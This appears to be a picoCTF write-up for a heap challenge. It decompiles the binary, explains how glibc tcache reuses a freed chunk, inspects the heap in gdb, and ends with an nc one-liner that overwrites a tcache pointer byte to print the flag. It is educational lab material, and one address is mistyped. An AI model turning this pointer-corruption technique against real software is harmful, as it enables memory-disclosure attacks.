## Code analysis

#### Reverse engineer:
```c
int main(void)

{
  long in_FS_OFFSET;
  undefined value_input;
  int address_input;
  int i;
  int64_t *null_ptr;
  char *ptr_a;
  FILE *flag_fd;
  undefined8 *local_88;
  void *void_ptr;
  undefined8 this_is_str;
  undefined8 a_random_str;
  undefined8 strings_str;
  undefined local_60;
  char flag_buffer [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  flag_fd = fopen("flag.txt","r");
  fgets(flag_buffer,0x40,flag_fd);
  this_is_str = 2338328219631577204;
  a_random_str = 7885631897793077345;
  strings_str = 3343762647516738336;
  local_60 = 0;
  null_ptr = (int64_t *)0x0;
  for (i = 0; i < 7; i = i + 1) {
    ptr_a = (char *)malloc(0x80);
    if (null_ptr == (int64_t *)0x0) {
      null_ptr = (int64_t *)ptr_a;
    }
    *(int64_t *)ptr_a = 8319381555649605443;
    *(int64_t *)((long)ptr_a + 8) = 7359007639828242465;
    *(int64_t *)((long)ptr_a + 0x10) = 2322295453215318380;
                    /* Congrats ! Your flag is:  */
    *(undefined *)((long)ptr_a + 0x18) = 0;
    strcat(ptr_a,flag_buffer);
  }
  local_88 = (undefined8 *)malloc(0x80);
  *local_88 = 6061881903935549267;
  local_88[1] = 2841330972353587560;
  local_88[2] = 8728099688704122996;
                    /* Sorry, this won't help you: */
  *(undefined4 *)(local_88 + 3) = 540702063;
  *(undefined *)((long)local_88 + 0x1c) = 0;
  strcat((char *)local_88,(char *)&this_is_str);
  free(ptr_a);
  free(local_88);
  address_input = 0;
  value_input = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf("%d",&address_input);
  printf("Value: ");
  __isoc99_scanf(" %c",&value_input);
  *(undefined *)((long)address_input + (long)null_ptr) = value_input;
  void_ptr = malloc(0x80);
  puts((char *)((long)void_ptr + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

#### Code analysis:

- The source code open the `flag.txt` file and then read it to buffer. Allocate buffer
- Allocates seven buffers, copies a string into them ("Congrats! Your flag is:"), concatenates the flag to each buffer, saves a pointer to the first buffer in `null_ptr` and a pointer to the seventh buffer in `ptr_a`
- Allocates another buffer, copies a string into it ("Sorry! This won't help you: this is a random string."), and saves a pointer to it in `local_88` buffer. I also appends another string to it.

- Free `local_88` and `ptr_a`'s heap chunks
- Asks the user to change the value of one byte, relative to the first buffer
- Allocates a new buffer and prints its contents (starting from offset 16)

#### Fix linker and run binary

Using `pwninit` to fetch linker library and patch binary

<img width="420" alt="image" src="https://user-images.githubusercontent.com/37280106/130640586-a0670379-7020-422b-af2d-ea7c50d2c561.png">

Add random values to see the binary output:

```
──(kali㉿kali)-[~/picoctf-2021]
└─$ ./heapedit
You may edit one byte in the program.
Address: 1
Value: 1
t help you: this is a random string.
```

We see the "t help you: this is a random string." string output. If you notice, the output is a part of `local_88` char buffer, why do we still see data of `local_88` buffer even when the program called `free(local_88)` ? 

One of the thing about `free(*ptr)` is that it does not zero out the memory.
When `free` is called, it convert the pointer back to chunk by subtracting the size of chunk metadata
The freed chunk are stored in corresponding “free bins” that operate as linked list. This requires each free chunk store pointers to other chunks.
**If the chunked is fit into a tcache bin, it will be stored there**

So now, we can guess what happened when we call `void_ptr = malloc(0x80);`. The freed chunk size is `0x80` is the size of new malloc is also `0x80`.

When the memory allocation happen, if the size of memory allocated corresponds to tcache bin and there is tcache chunk available, it will return that immediately.

Using gdb to inspect the tcache bins,

```
gef➤  heap bins tcache
──────────────────────────────────────────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90] count=1  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) 
```

The Tcache bin has a pointer to the address `0x603800` 

Inspect heap chunks:
<img width="918" alt="image" src="https://user-images.githubusercontent.com/37280106/130712565-a19b5e57-20a6-4751-a5db-8b9a679ddf2f.png">

as we can see, our string is at `0x603800` and our flag buffer input is at `0x6034a0`

We need to find out the address of the pointer pointing to `0x603800`

<img width="602" alt="image" src="https://user-images.githubusercontent.com/37280106/130714824-eb0e9bcd-cb2e-4cc5-af03-71fb78cc2bc4.png">

Calculate offset from the address pointer to the flag buffer's address

```
gef➤  p/d 0x602088 - 0x6034a0
$5 = -5144
```

we have pointer at address `0x602088` is pointing to `0x60800`, we want to modify the LSB to `0x0` so at the next chunk allocation, it will allocate the memory contains our flag and print it out.

```
{ echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 31533
> picoCTF{...}
```
